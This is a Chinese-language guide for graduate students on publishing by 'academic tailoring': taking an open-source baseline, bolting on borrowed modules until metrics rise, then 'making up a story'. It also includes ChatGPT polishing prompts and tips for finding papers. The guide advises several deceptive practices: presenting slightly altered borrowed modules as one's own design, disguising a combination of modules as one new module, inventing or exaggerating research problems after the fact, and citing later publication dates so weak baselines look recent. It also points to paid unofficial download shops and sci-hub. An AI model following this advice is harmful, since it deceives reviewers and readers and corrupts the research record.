⽔论⽂第⼆步则是要在地基上构造出⾃⼰的房⼦，那怎么构造呢？其实也并不是通过我们的技能知识进⾏构建，即并不是让你成为砖匠、瓦匠和⽊匠， 因为我们的⽬的是建出⼀个房⼦，这个房⼦看起来是个房⼦即可。那我们该 怎么做呢？这个房⼦的墙⾯设计的好，搬过来；那个房⼦的屋顶设计的好， 搬过来，⽽我们的⼯作就是把这个墙⾯和屋顶在地基上拼接出来（即， Baseline + A + B），懂了吗？因此，对于技能知识的学习，我们并不需要 构造模块，我们只需要慧眼识珠找到模块，我们真正所需要会的就是如何把这两个模块缝起来，所以我们对于胶⽔技能，越扎实越好；对于模块技能， 浅尝即⽌。 对于⽅向内专业技术的学习，可以去下载⼏篇你选择的⽅向的综述，英⽂的综述要下载，中⽂的综述也要下载 英⽂综述（1-2篇引⽤次数᫾⾼的，精读⼀两篇即可）：⼀般你这个⽅向从 零到⼀，细枝末节都会给你讲明⽩，数据集、常⽤模型、评价指标都会和你 说的⼀清⼆楚，可以细看，但是看不懂的地⽅可以跳过，对你的⽅向的⼀些 专业技术做到⼼中有数即可。 中⽂综述（2-3篇，少看不⾏，多看⽆益）：紧追实事，不给你⼀句多余的 话，说⽩了很多就是导师下的死命令，⾃⼰随便找了⼏篇英⽂综述拼拼凑 凑，看他的主要⽬的是知道你们⽅向英⽂词和中⽂词的对应关系，顺带加强下你对你们这个⽅向脉络的了解。 学基础的时候，不仅不要不注意细枝末节，更重要的是理清基础的脉络，知道你们这个领域、这个⽅向是如何发展到今天的，⼀步⼀步怎么⾛过来 的，其实就是对综述的把握，未来相关⼯作的写作思路。此外，如果是偏实验 学科，还需要在学基础的时候，把握住每⼀个⼩的实验的流程，因为未来你开始动⼿做实验的时候，其实就是⼀个个⼩实验的总和，你遇到的bug也就是你 做⼩实验时遇到的那些bug。 工具使用推荐easyScholar插件，能显示期刊分区 通过百度的搜索，我们能学习到正确总结问题，找到问题关键点的能⼒。然后，再去使⽤ChatGPT，你只要问题总结的好，问得好，得到的答案不仅更符合你内⼼想要得到的那个答案，更不会得到⼀个错误的答案⽽不⾃知。 最后ChatGPT的能⼒绝不仅仅只是回答你的问题那么简单，它的能⼒太强太强 了，研⼀的同学⼀定要花时间好好学学这个东⻄，然后要善于利⽤它，科研神器⼀点都不过分。当然，百度和ChatGPT⽐也不是⼀⽆是处，因为两者⾛的路 线也完全不⼀样，不要⽤了ChatGPT就忘了百度。 ChatGPT只要知道它能 帮你润⾊论⽂就⾏了，然后你只要掌握怎么让他帮你润⾊的⽅法就⾏。 ChatGPT是美国佬创⽴的，训练ChatGPT时可能偏向英语，因此，当我们 让ChatGPT帮我们⼲活时，尤其是类似论⽂润⾊这种精细活，最好是使⽤英⽂指令。 如果你只是做英⽂润⾊⼯作 和中英互译的⼯作，真的很没有必要，GPT3.0⾜够你使⽤了，⽽且还很多 余了。你要知道GPT增加了什么功能，这些功能对于你的润⾊起不了质的变 化，你的论⽂也不可能因为你⽤GPT4润⾊了就能增⼤中稿的概率 由于ChatGPT⾃⼰本身的限制，普通版本单次输⼊输出共限制3000字，但 是，你不要真的⼀次性给别⼈3000字，最好是⼀次不超输⼊超过1000字的字符。 如果你的论⽂中有数学公式，可以⼤胆点，ChatGPT虽然⽆法识别公式， 但是对于⽆法识别的公式这附近的内容会原封不动的进⾏替换（注意：\\会 替换成\\，涉及计算机领域的知识，不解释，但是需要注意），即使你段落 内有数学公式，也可以⼤段放⼊润⾊。如下图所示： 英文润色Below is a paragraph from an academic paper. Polish the writing to meet the academic style, improve the spelling, grammar, clarity, concision and overall readability. （不指定研究领域）Please polish my research paper to make it more concise, readable, and engaging. I need help with editing, proofreading, and making any necessary improvements to the language and grammar. I am looking to improve the overall quality of my paper and make it ready for submission to a scholarly journal : 冒 号后⾯输⼊你需要润⾊的论⽂（尽量不要超过1000字） （指定研究领域）Hello ChatGPT, I would like to request your help in correcting my research paper in the area of video captioning (请注意替 换论⽂的研究领域). I have already written the paper, but I need assistance in improving the language, grammar, spelling, and punctuation. My paper is intended for submission to a scholarly journal, and I need it to be error-free and polished to the highest standards: 冒号后⾯输⼊你需要润⾊的论⽂（尽量不要超过1000字） 输⼊演示 中英互译 Translate this Chinese into English: 冒号后⾯输⼊你需要翻译的⽂字（尽 量不要超过1000字） Hello ChatGPT, please translate my research paper from Chinese to English, and make the translation accurate and professional: 冒号后⾯ 输⼊你需要翻译的⽂字（尽量不要超过1000字） 使⽤演示： 如果通过ChatGPT撰写出⼀篇论⽂，⽆疑是给⾃⼰的学位证埋雷。通过ChatGPT撰写的论⽂⽆异于机构写⼿的中英互译和拼凑论⽂的⽅法，甚⾄由于ChatGPT只能帮你搜寻他学到的东⻄，没有推理能⼒，那么ChatGPT写出来⽂章的还⼤有可能⼀稿多投。也就是说，即使ChatGPT能帮你写出⼀篇论⽂，也是⼀篇⻛险极⼤的论⽂ 不过，我们可以通过ChatGPT完成⼀些重复性体⼒⼯作，⽐如相关⼯作的撰 写。当然，也可以通过ChatGPT给予我们⼀些写作的灵感，这也是可能达到的。 研究生三年规划是按照⼀个⼈每天能有4-6个⼩时的有效时间放在论⽂上⾯， 然后⼤概就是最好有⼀个996的状态。论⽂说简单很简单，它的套路简单，尤其是你看完该指南后，按照指南的规划 ⼀步⼀步⾛，不存在发不出来论⽂的可能；但是论⽂说难也很难，需要时间的 积累，绝不是说你摆个两年、三年就能搞定的。你说摆个两年、三年能不能搞 定，能，只要你⼤胆，把三篇英⽂拼在⼀起，也是⼀篇⼤论⽂，⽽且语⾔写作 功夫好，甚⾄还能骗过盲审专家拿到学位证，但是，⼈不到万不得已，为什么⾮要给⾃⼰安⼀个陪伴⾃⼰终身的雷呢？⽽且，你们要知道，即使研究⽣毕业 ⼤论⽂造假，也是需要有⼀定⽔平的，绝不是本科毕业论⽂那样，临时抱抱佛脚就⾏。 研一打基础基础阶段越扎实越好，然后⼀般研⼀还会有课要上，所以，对于打基础，我觉 得配合上暑假期间的懒散学习，开学后再花个半年左右的时间，期间可以定下 ⽅向，看看综述了。⾄于要学什么基础，可以看章节“基础的寻找和学习” 也就是这应该是你研⼀下开学前就应该要完成的事！ 看论文如果你⽤的是学术裁缝的想法，看论⽂其实不需要看那么多⽂章，精读⼏篇⽂章就可以了。可能就是在找基准模型的时候可能要花点功夫，当然，你找基准模型，也没必要读懂那篇⽂章，就是不断反复地尝试，这个时间其实是很漫⻓的，运⽓好的可能⼀两个⽉就结束了，运⽓不好的可能要花个三四个⽉。 也就是说，找到⼀个基准模型，然后加上精度⼏篇⽂章找模块这个过程基本也 要有⼀个半年的时间。也就是到了研⼆上开学的时候，你就应该有⼀个可以正 常运⾏的基准模型了，以及很多个可以尝试排列组合的模块想法了。 做实验缝模块也是⼀个漫⻓的过程，且很扎⼈⼼的过程。因为你⽆法判断哪个模块加上去⼀定有⽤，如果这个模块没⽤，配合上科研trick也没⽤，只能换⼀个模块 继续尝试，继续使⽤科研trick调整它的指标性能。这个过程其实也是需要花2-3 个⽉。 当你确定了模块之后，你就需要做消融实验，其实当你在缝模块的时候，就是在做消融实验，只不过做的消融并不⼀定全⾯，现在就是去补充实验。然后精挑细选出⼏个好的案例，放到未来论⽂的案例分析⾥去。这个过程可能也要花个1-2个⽉。 总的来说，实验可能也要占据你半年的时间，也就是说，研⼆下开学的时候，你的实验已经全部完成了。 写论文当你写论⽂的时候，⼀定是找到了⽬标期刊的。其实写论⽂其实不难，但也不 简单，⼀般这些流程加在⼀起1-2个⽉也就完稿了，然后论⽂投出去了。也就是 说快⼀点的，研⼆下刚开学就完成了⼀篇论⽂的投稿；时间慢⼀点的，可能研 ⼆下开学，还要花个⼀两个⽉的时间。 大论文⼤论⽂其实在你研⼆结束的那个暑假，就应该有构思有规划，然后在⼗⽉份之 后可以尝试初步的动笔，有些学校对⼤论⽂的要求晚的，可以推到国考之后开 始动笔，但是基本研三下⼀定是要完成⼤论⽂的写作的。因为研三下，才是考 公考编的同学⻩⾦时间，对于进⼚的，可能会宽松很多。 搜索论文并下载四种方式搜论文： WOS，https://www.webofscience.com/wos/alldb/basic-search：⽐᫾规 范，但主要针对已经建刊的论⽂，在线发表的论⽂搜不到，使⽤起来也麻 烦，不推荐使⽤； ⾕歌学术（镜像版），http://scholar.scqylaw.com/：搜英⽂论⽂就⽤它 了； 知⽹，https://www.cnki.net/：搜中⽂论⽂就⽤它了，并且能找到硕博⼤论⽂； 百度学术，https://xueshu.baidu.com/：搜英⽂论⽂有⾕歌学术（正常⽆ 法访问，但有镜像版），搜中⽂论⽂有知⽹，要你何⽤？ ⼀般搜索论⽂的⽅式，就是通过关键词搜索论⽂，这也就够了。 中⽂论⽂：某宝搜索“论⽂下载”，然后会出现⼀堆的商品，购买可以包⽉包 年的中英⽂数据库，⼀⽉市场价9.9元，⼀年市场价30-40元； 英⽂论⽂：某宝搜索“论⽂下载”，然后会出现⼀堆的商品，购买可以包⽉包 年的中英⽂数据库，⼀⽉市场价9.9元，⼀年市场价30-40元； 如果上述给出的中英⽂数据库也⽆法下载你想要下载的论⽂，同样去某宝搜索 “论⽂下载”，然后找那种指定论⽂名下载的店家，⼀篇论⽂下载市场价1-5元 对于找不到的中⽂论⽂，我也不知道有啥好⽅法，那就去某宝只买中⽂论⽂数 据库，⼀个⽉5元； 对于找不到的英⽂论⽂，可以尝试sci-hub：https://sci-hub.ru/ 搜论⽂主要其实就是推荐知⽹和⾕歌学术，对于下载的话，只推荐⼀个，去淘 宝买包⽉包年的中英⽂数据库，实则也可以去你购买的数据库⾥搜索。 综述和研究性文章综述性综述性⽂章说⽩了，就相当于⼀本历史书和⼀本百科全书的总和，他不仅 和你讲清楚了你这个领域的从零到⼀的发展脉络，还能和你理清你们这个领域 现存的问题、待解决的问题、以及数据集、指标等等。 ⽽不同的综述性⽂章⼜有什么不同呢，就是对于这个发展脉络的整理⽅向不⼀ 样，⽐如历史书，可能有的⼈从帝皇的⻆度整理，有的从⼠⼤夫的⻆度整理， 有的从平⺠百姓的⻆度整理，从不同的⻆度整理需要解决的问题也是不⼀样 的。也就是说，东⻄仍然是那个东⻄，只是从不同的⻆度去分类汇总那个领 域，⼀般不同类型的看个2-3篇就够了，然后⾃⼰思考下⾃⼰要从哪个⽅向出发。 ⼀般推荐看英⽂综述，⼤多数中⽂综述都是揉了2-3⽚英⽂综述的某个⽚段，⼀般都不成体系，为了写综述⽽写综述，亦或者是摘抄了某篇综述的某个 分类，然后⾃⼰再添加了⼀点东⻄。但是中⽂综述也可以看看，这样可以知道 你们这个领域的关键词对应的英⽂是什么。 ⼀个领域，没有综述性⽂章，我只能说能否找些相似领域的综述性⽂章，如果 连相似领域都没有，放弃吧！你凭什么觉得你能做出来⼀个开天辟地的东⻄？ 我们国家的第⼀艘航⺟“辽宁舰”都是从乌克兰买来的“瓦良格”号航⺟。对于造航 ⺟的同学，真⼼推荐不如裁缝出⼀篇论⽂保毕业 研究性研究性⽂章就是 历史中的⼀个⼜⼀个节点，叙说着⼀个⼜⼀个美丽的故事。对于研究性⽂章⼀ 般会通过以下⼏个部分去叙说⼀个完整的故事： 摘要：对于引⾔、相关⼯作和⽅法的总结，⽤的都是⾮专业术语，⼤⽩话讲 清楚你做了个啥玩意； 引⾔：对于相关⼯作和⽅法的更详细解释，有⼀个上下⽂的逻辑关系； 相关⼯作：领域内和你相关、相似的⼀些⼯作发展情况； ⽅法：你创新的内容和具体做法； 实验：你的⼯作的性能展示，⼀般就是对⽐试验、消融实验和案例分析； 总结：⽅法和实验部分的总结，⾔简意赅你做了什么，达到了什么程度。有 些期刊还会要求⼀些⽆意义的未来展望。 水刊和顶刊阅读很多时候，我们刚进学校，导师就会推荐我们看⽂献，有些导师甚⾄会甩⼀堆 ⽂献到你脸上，这些⽂献越看越懵逼，因为绝⼤多数都是领域内的经典，经典 必然就是顶刊。即使我们有时候问导师，我们应该搜索哪些期刊的⽂献阅读，导师也会让你去 看顶刊顶会的论⽂ 先看水刊再看顶刊即使你把基础学得很好了，但是因为论⽂还是有其他的⼀定路数的，不同级别 的论⽂路数⼀不⼀样，但是⽔刊基本是⼀点路数都没有的，就像⼀个⾚裸的⼥ ⼦（男⼦）站在你⾯前，⼀览⽆遗。个⼈更建议先看⽔刊⽔会，看⽔刊⽔会的⽬的也很简单，因为你看论⽂的⽬的不仅要知道你未来的下限可以在哪⾥，更要知道⼀篇论⽂是怎么写出来的了。⽽对于顶刊顶会，经常会⽤⼀些花⾥胡哨的语⾔和⽅法去修饰它所做的内容，也就是⽔刊⽔会是脱去了外⾐的顶刊顶会，你不存在看不懂它的时候。 通过⽔刊⽔会，你很容易掌握论⽂的基本招数，并且每当你看到⼀篇⽔刊的时候，都会惊讶到：原来如此，原来这样就可以发论⽂了呀！ 再看顶刊顶会当你通过阅读⽔刊⽔会，习得了论⽂的基本招数之后，再来看顶刊顶会，便可 以试着⾃⼰慢慢的揭开顶刊顶会的那层外⾐，甚⾄要习得顶刊顶会的招数：如 何把⼀篇屎⼀样的⽂章雕刻成⼀朵花，简称屎上雕花。 也就是看顶刊顶会的⽅法实则很简单，⾸先通过⽔刊的⽅法去看这篇顶刊顶会 的基本做法，然后再通过思考去观察出顶刊的外包装，然后总结这种包装的⼿ 法，以后⾃⼰写论⽂的时候可以⽤上。也就是，你会发现其实顶刊顶会的做法和⽔刊⽔会的做法实则没什么区别，主要就是它的外包装实在是太华丽了。 阅读文献中文核心 ⾸看摘要和总结是否符合⾃⼰的⽅向。 初看引⾔判断这篇⽂章对⾃⼰有没有过多的作⽤，这个时候都是略看。 如果有⽤再重细看引⾔。 然后细看⽅法和消融实验，其余的部分没啥好看的； 如果略看的时候，就发现这篇⽂章对⾃⼰没有⽤，那就换⼀篇⽂章。 外文核心⾸先，你看的前⼏篇论⽂，尤其是综述，我个⼈更建议你打印成纸质的看，不要去特地的借助某⼀款论⽂翻译软件，不懂得词尽量百度，不懂得句⼦尽量去 思考下怎么理解，实在不⾏直接跳过，你现在不是在考英语考试，看得懂看不 懂⼀两句话不重要，重要的是你能⼤概理解这篇论⽂。 刚开始看英⽂论⽂的时候⼀头乱麻，但是⼀篇论⽂横竖就这⼏个版块：摘要、引⾔、相关⼯作、⽅法、实验和总结，每个版块都是固定死的，以 及他们的作⽤和写法也都是固定死的。其次，只要你在你这个领域深耕下去， 读个两三篇论⽂，你就会发现你这个领域⽤来⽤去就那⼏个领域词，句⼦⽤来 ⽤去也就那⼏个句⼦，尤其是⽔刊。 如果你的⽬标不是保毕业，⽽是读博搞科研，那就不能略读了，必须得精读⼤量的顶刊顶会，看这些⽂章是如何写作，如何屎上雕花的，详情可看章节“顶刊和⽔刊看哪个”。 顶刊论文⾸先我在百度学术上通过我们领域的关键词“video captioning”搜索了近两年所有的⽂章 然后按照SCI分区，得到了如下图所示的结果： 阅读工具其实你⽤哪⼀款pdf⼯具都⾏，只要这个pdf⼯具能正常的看pdf即可。对于翻译软件更是如 此，我觉得你的精⼒真的没必要过多的放在这⾥。如果你⼀来就过度的依赖论⽂阅读⼯具，如果你只是读个⼀两篇论⽂也就罢了，否则你⼀来就把你的上限摆在那⾥了， 以后每次读论⽂都需要靠这个软件，不仅阅读⽂献麻烦，更难读到论⽂的⼀些共性精髓，看到的都是论⽂⾥那些⽐᫾浅显的东⻄，⾮常不利于 你未来的编故事和写作。 学术裁缝​ 搞科研的做法是，先提出问题，然后找到⽅法解决问题，⼀般衡量这个问题是否被解决的做法，就是看你的⽅法有没有在⼀些指标上的提升，也就是说，如果搞科研时抛掉问题不谈，最重要的就是指标上有提升。 ​ 学术裁缝的做法就应运⽽⽣，我们先不讨论有什么实际问题需要我们去解决，我们做的时候，先想办法让⼀个⽅法在指标上有提升，然后再谈问题；等 我们未来写的时候，我们先谈问题，再谈做法。 ​ 通过学术裁缝这样做的话，在我们眼中，是先提出⽅法，再谈问题。但是在审 稿⼈眼中，我们是提出问题，再提出⽅法，就是搞科研的那⼀套，只要把审稿⼈唬住了，论⽂也就被接受了。现在就是两个问题，如何找到⼀个⾏之有效的 ⽅案让我们提出来的⽅法在指标上有提升，并且我们⼜如何在提出这个⽅法之后有效的提出⼀个问题呢？即如何编⼀个好故事。 基准模型学术裁缝的做法，⾸先就是去论⽂⾥找到⼀个基准模型A，就类似于我们建房 ⼦打地基⼀样，去找到⼀个好的地基。注意，并不是⾃⼰筑基，⽽是去找⼀个 地基，然后原封不动的搬过来⽤。 随便找到⼀篇⽂章，都会有他的⽅法介绍表，如下 图所示（⼀般就是对⽐实验或消融实验表，详情查看章节“论⽂的三个实 验”）。 对于上述这张表格，可以很容易的发现，本篇⽂章使⽤的⽅法 UNQE、BLEU、 BERT、chrF都是最最基础的基准模型，他们基本是不可分割的。⽽最后⼀⾏的 Bi-LSTM+attention+BERT+QE实则就是作者最后的⼯作，那么 BiLSTM+attention+BERT+QE就可以作为我们的基准模型，也就是我们找到这篇⽂章的源代码，原封不动的拿过来即可，未来我们只需要在这个上⾯改造就⾏。 当然，基准模型他不是⼀个很死的东⻄，并不是说你就⾮要拿 Bi LSTM+attention+BERT+QE作为基准模型，因为对于这篇论⽂的作者⽽⾔，其 实 BERT就是他的最基础的基准模型，然后他拼接了QE、Bi-LSTM和attention 三个模块上去，也就是什么意思呢？我们也可以拿 可以使⽤表格⾥的 BERT作为基准模型，我们也 ESIM+BERT作为基准模型，同时可以拿 Bi LSTM+attention+BERT作为基准模型。 基准模型说⽩了就是⼀⽚论⽂整个使⽤ 的⽅法⽽已，我们直接拿来就⽤即可，当然，也可以是这篇论⽂⾥出现的其他的⽅法。 上述的所有的基准模型都离不开BERT这个东⻄， 也就是BERT是最最基础的基准模型， ⾄于QE、Bi-LSTM和attention就都是模块了，然后玩的就是组合。 BERT是⼀个很⼤的东⻄，可以叫做框架； ⾄于QE、Bi-LSTM和attention都是很⼩的⼀个东⻄，也就是⼀些⼩组件。 基准模型和地基⼀样，要越牢固越好， 怎么确保基准模型牢固，⾮常简单，也就是我们找基准模型，必须得找近两年的顶刊顶会的论⽂，最好就是最近的顶刊顶会。那为什么⾮要找顶刊顶会呢？ 因为学术裁缝就⼀个原则，能挪⽤的绝不构造，⼀般顶刊顶会的摘要的最后⼀ 句，会附上他们的⽅法复现链接， 除了顶刊顶会的论⽂，99%都不会开源（在我⼼⾥，不开源等同于造了假，好好悟⼀悟这括号⾥这段话），也就做不到挪⽤，所以最后你的论⽂基本也不会选择开源。其次，相⽐较其他的论⽂，顶刊顶会⼀定是最牢固的。 近两年的论⽂都没有开源⽅法，有⼀篇近3-4年的⽂章开源了 ⽅法，且可以复现，能不能作为基准模型？完全可以，有⼀个总⽐⾃⼰从零到 ⼀构造的好，除⾮他⽼的过分了。学东⻄千万不要 模块当我们找到学术裁缝的地基之后，我们就要开始考虑在地基上建房⼦了。 同理，也不是⾃⼰去构建模块建房⼦，也是去不同的论⽂⾥找到不同的模块B、 C、D、E和F。 当我们把基准模型A和模块B、C、D、E和F都找到后，然后我们就开始做学术裁缝了，试⼀下A+B的性能如何，再试⼀下A+B+C的性能如何，再试⼀下 A+B+E的性能如何，再试⼀下A+B+C+E+F的性能如何，说⽩了，就是不断地排列组合，直⾄找到⼀个指标上有提升的组合⽅法。假设A+B+F的组合性能是最优的，那么我们就把A+B+F当做我们的房⼦（⽅法），进⽽我们的第⼀个问题找到指标上有提升的⽅法就被解决了，剩下的就是第⼆个问题编故事。 基准模型占⽐95%，⽽模块占⽐5%。因此对 于模块，其实没有那么多讲究，⽆论是来⾃于顶刊顶会，还是来⾃于⽔刊⽔ 会，亦或者是⾃⼰⼿动构造的，其实都可以。 ⼀定要选择做的⼈多的那个⽅向吗？做的⼈ 多，发的论⽂多，开源⽅法的⼈才会多，你能挪⽤的基准模型也才会多。同 理，找模块的时候也是同样的道理，做的⼈越多，能找到的好模块也就越多。 放到最后就是你组合的⽅法也就越多，缝出⼀个有效的⽅法的速度也就越快。 缝模块怎么排列组合，很简单，A+B、A+C、A+D、A+E、A+F、A+B+C、 A+B+D……，没有技巧，就是不断地尝试，然后配合各种科研trick，直到找到 ⼀个在指标上有提升的组合⽅法 A是⼀个框架的东⻄， B、C、D、E和F是模块，都是很⼩的，我们的⼯作并不是设计⼀个A，顶多设 计⼀个B和C，也就是我们需要学习的并不是如何去构造出⼀个A的基础，⽽是 构造⼀个B的基础，然后最重要的就是把A和B缝在⼀起的基础，对于Ai⽽⾔， 就是把Python学得越扎实越好，因为把A和B缝在⼀起，靠的就是Python。 正常缝模块的⽅式，就是A+B。这样很容易让别⼈看出来你再做的就是拼接， 因为你原封不动的使⽤了B，你只能通过引⽤来告诉别⼈你的B不是你的。那 么，我们是否可以考虑对B进⾏改进，什么改进都⾏，就是把B改进成B’，那么 你就可以在⽅法介绍⾥说，⾃⼰设计了⼀个B’，⽽不是说成引⽤了B的⽅法。 编故事毫⽆疑问的就是，我们A+B+F在指标上有了提升，但有了提升远远是不够的。 但是⼜因为指标上有了提升，那么我们的A+B+F相⽐A⼀定是多解决了什么问 题的，⾄于解决了什么问题，其实我们现在也不太清楚。 因此，这个时候就得编故事了，怎么编呢？这⾥给出⼀些简单的想法，⽐如我 们是加了B和F两个模块，由于B和F⼀定是来⾃于某篇论⽂的，那么我们是否可 以引⽤B和F论⽂的思想，即解决了B论⽂提出的问题，或解决了F论⽂提出的问题，解决的更好了，亦或者同时解决了B和F两个问题。更多编故事可查看章节 “如何编个好故事”。 我们的基准模型⼀般是来源于近两年的某⼀篇顶刊顶会，并且A他是⼀个很⼤的东⻄，占⽐相当于95%吧。⽽未来我们添加的模块，⽆论是来源于顶刊顶会，还是来源于⽔刊⽔会，他的占⽐也就是5%。什么意思呢？模块⽆论效果好坏，都很难对我们的基准模型A造成很⼤的实质影响，即模块的添加不会对A的指标上的数值造成特别⼤的波动，如果再配合⼀些科研trick，那么基本上就是稳增不降，实在不⾏再换换模块，基本上配合上 科研trick再换⼏个模块就出来⼀个有效的组合⽅法了。 很多同学，经常学到了我的这个⽅法之后，会兴奋的跑过去和导师说：我发现 了⼀个A+B+C的⽅法，指标上有了很⼤的提升，我能发论⽂吗？你这种说法， 基本上都要挨批。 ⼀定要记住，我们学术裁缝做的时候是⽤组合的⽅法做，但是说的时候，⽆论是论⽂写作，还是对你导师讲，还是对其他任何⼈讲，都要先去找到问题，再 谈你如何做的，⼀定要⽤科研的思维去包装你的学术裁缝的这个⾏为。 如果是⽤了A+B+C学术裁缝做出来的实验，那么就可以使⽤复刻思想和堆叠思想的两种⽅法。这⾥的B和C特指在B和C论⽂后改进过的B和C，即和原来的B、 C是有异同的。 复刻思想其实很简单，⼀般我们的模块B和C是来源于某篇⽂章的，这篇⽂章也 ⼀定介绍了B的作⽤，C的作⽤。那我们论⽂的思想，就是复刻这两篇论⽂的思 想，也就是我们发现了B问题，然后通过设计了⼀个⽅法A+B解决了这个问题， 相⽐较前⼈解决的更好；同理，也就是我们发现了C问题，然后通过设计了⼀ 个⽅法A+C解决了这个问题，相⽐较前⼈解决的更好。 注：基准模型A解决的问题，也可以搬过来⼀起说。 堆叠思想就很简单了，即我们不是把B和C分开，⽽是想办法把B和C揉在⼀起，变成⼀个问题，这个会和下⽂的“强扯问题”很像，但⼜不⼀样。因为这种做法是有参考的，有⽅向的，有理有据的，这种做法也会更 会让你的⽂章上⼀个档次，具体怎么糅合就得看你⾃⼰了。B是为了解决B问题⽽设计的，C是为了解决C问题⽽设计的，然后B和C放⼀起解决了什么问题，⽽B和C放⼀起解决的问题就是本⽂的最核⼼的创新，甚⾄可以作为标题。堆叠思想是通过裁缝的模块去糅合⼀个问题。 强扯问题，就是真正的强扯问题了，即现在我们做了⼀个⽅法，既不是⽤学术 裁缝的⽅法，也不是搞科研的⽅法。说⽩了，现在我们就是有⼀个⽅法，也不 知道解决了啥问题，亦或者以前提出的问题创新度不⾼，就可以⽤这⼀招。具 体来说，也很简单，就是⾃⼰去挖掘你这个领域内的问题，这个问题可以适当 的夸张点，然后和你的模块匹配上，只要听上去还不错，好像是那个理，然后能⾃圆其说即可。对，就是这么简单，其实真的就是这么简单，不⾏，你⼤可 ⼀试，尤其是准备发⽔刊包毕业的同学。 科研trick，其实原理很简单，就是我们缝模块的时候，有些模块缝上去， 实验效果好，但是不好编故事；有些模块缝上去，实验效果不好，但是好编故 事。因此，我们可以将这两个模块捆绑在⼀起，即本来是A+B+C，那么我把 B+C说成是⼀个模块D，也就是我的⽅法变成A+D，然后实验效果有了，故事也 可以编了。⾄于D是不是B和C的组合，除了⾃⼰⼼⾥清楚，还有谁清楚？ 编故事举例\\和领域⽆关，只要认真看完，你不是这个领域的也能看懂作者在做⼀件什么样 的事情，其实这就是我们⼀直着重介绍的学术裁缝，希望也能通过这个告诉你 们，学术裁缝也能发顶刊，但是得看你如何编。为了看这篇⽂章如何编⼀个好 故事的，我们⾸先来看下这篇⽂章的摘要，英⽂的摘要写的太⽜逼了，我们直 接看翻译版本的： 近年来，配对图像和句⼦的⼤规模数据集在⾃动⽣成图像描述（即图像字幕） ⽅⾯取得了显著成功。然⽽，在每个领域中收集⾜够数量的成对图像和句⼦是 劳动密集型和耗时的。将在具有成对图像和句⼦的现有域（即源域）中训练的 图像字幕模型转移到仅具有未配对数据的新域（即⽬标域）可能是有益的。在本⽂中，我们提出了⼀种利⽤跨模态检索模型的跨域图像字幕的跨模态检索辅 助⽅法以在⽬标域中⽣成图像和句⼦的伪对，以促进字幕模型的⾃适应。为了 学习⽬标域中图像和句⼦之间的相关性， 我们提出了⼀种迭代跨模态检索过 程，其中⾸先使⽤源域数据预训练跨模态检索模型，然后将其应⽤于⽬标域数 据，以获取⼀组初始的伪图像句⼦对。通过使⽤伪图像语句对迭代地微调检索 模型并使⽤检索模型更新伪图像语句，来进⼀步细化伪图像语句配对。为了使 在源域中学习的句⼦的语⾔模式很好地适应⽬标域，我们提出了⼀种⾃适应图 像字幕模型，该模型具有使⽤精化的伪图像句⼦对进⾏微调的⾃注意机制。在 使⽤MSCOCO作为源域和使⽤五个不同数据集（Flickr30k、TGIF、CUB-200、 Oxford-102和Conceptal）作为⽬标域的⼏种设置上的实验结果表明，与最先 进的⽅法相⽐，我们的⽅法取得了更好或可⽐的性能。我们还将我们的⽅法扩 展到跨域视频字幕，其中MSR-VTT⽤作源域，另外两个数据集（MSVD和 Charades字幕）⽤作⽬标域，以进⼀步证明我们⽅法的有效性。 可以把这篇论⽂分为两个部分，其中第⼀部分如下图所示，这⼀部分实则早就 有⼈做过，只不过本⽂作者把LSTM替换成了GRU，当然还有没有做其他⼩的 改进，没有细看，也不重要。 其中第二部分如下图所示，也是⼀个现有的技术，只是本⽂作者做了红框中的 ⼀个改进，这个改进乍⼀看也⾮常⽜逼，但是实则，我讲⼀下你就懂了。 这个改进是什么呢？我们来看下图，传统的LSTM的做法是LSTM cell –&gt; LSTM cell –&gt; …… –&gt; LSTM cell串联，传统的BERT的做法是 Self-attention –&gt; Self attention –&gt; …… –&gt; Self-attention串联，现在作者的做法是，Self-attention –&gt; LSTM cell –&gt; Self-attention –&gt; LSTM cell –&gt; …… –&gt; Self-attention –&gt; LSTM cell，即交叉串联。这种交叉串联其实也是早就被其他⼈在其他的领域⽤过的⼀个⽅法。 找了两个⼤的模块A和B拼在⼀起，然后把 A内部的LSTM替换成了GRU，把B内部的LSTM替换成了LSTM+Attention的交叉串联。单轮这种技术的实现，想必每⼀个有着⼀年基础的Ai的学⽣都能实现，甚⾄你的做法⽐他还⾼⼤上，你⾃⼰还提出了什么真正的纯新的技术，但为什么你发不了顶刊？你可以再看看别⼈摘要⾥写的那段话： 在本⽂中，我们提出了⼀种利⽤跨模态检索模型的跨域图像字幕的跨模态检索辅助⽅法以在⽬标域中⽣成图像和句⼦的伪对，以促进字幕模型的⾃适应。为了学习⽬标域中 图像和句⼦之间的相关性， 我们提出了⼀种迭代跨模态检索过程，其中⾸先使⽤源域数据预训练跨模态检索模型，然后将其应⽤于⽬标域数据，以获取⼀组初始的伪图像句⼦对。你能编出这么完美的⼀个故事吗？当然，如果你仔细研究过IEEE顶刊的作者挂名，也会发现⼀个既定的事实，你有⼈帮你撑腰吗？ 好对比 此外，我们再来看看这篇论⽂的对⽐模型，这篇论⽂是2020年5⽉1⽇提交论⽂ 到顶刊的。我们来看看他的5个对⽐模型，作为2020年5⽉1⽇提交的论⽂，反 正我2022年5⽉也提交过⼀篇论⽂到这个期刊，拒稿的原因就是我的⽐较模型过旧，还应该拿出⼀篇2023年的论⽂进⾏⽐较，我寻思着我还找了3篇去年的 顶刊顶会呢？在这⾥想说明两个点： 审稿需要运⽓； 你能相信2019年总共就两篇顶刊顶会的论⽂吗？⼀定不是，那么我们就可 以将军⾥⾯挑矮⼦了。 DCC [32] (2016) CVPR SAdT [7] (2017) ICCV DL [34] (2017) ACM conf MLADIC [35] (2019) ITMM Graph-Enc-Dec [22] 2019 ICCV 最后，其中MLADIC这篇论⽂可以通过下图的图⽚看到，早在2018年就被接收且在线发表了，⽽作者引⽤了他19年正式出版的引⽤，这不就是⼀个科研trick 吗？我们未来引⽤的时候，可以找⼀些正式出版⽐较慢的顶刊，可能这篇论⽂ 早就被发表了，那么他的性能必然是不太好的，但是我们引⽤的时候引⽤了最 新的⽇期，即看起来是⼀篇很新的论⽂。 这篇顶刊从未涉及任何学术不端啥的，通过这篇论⽂是想让⼤家可 以借鉴他的写作⼿法，对⽐模型的⽅法，这才是很重要的，⽽不是去钻⽜⻆ 尖。⼀定要记住，想发好的⽂章，性能⼀定要有，但只是⼀个⽅⾯⽽已，写作 能⼒很重要，还有很重要的就是各式各样的科研trick， 开题答辩他⽤这个技术做他的那个⽅向可不可以，实则这就是开题答辩的作⽤。也就是说，开题答辩是你⾃⼰写⼀份开题报 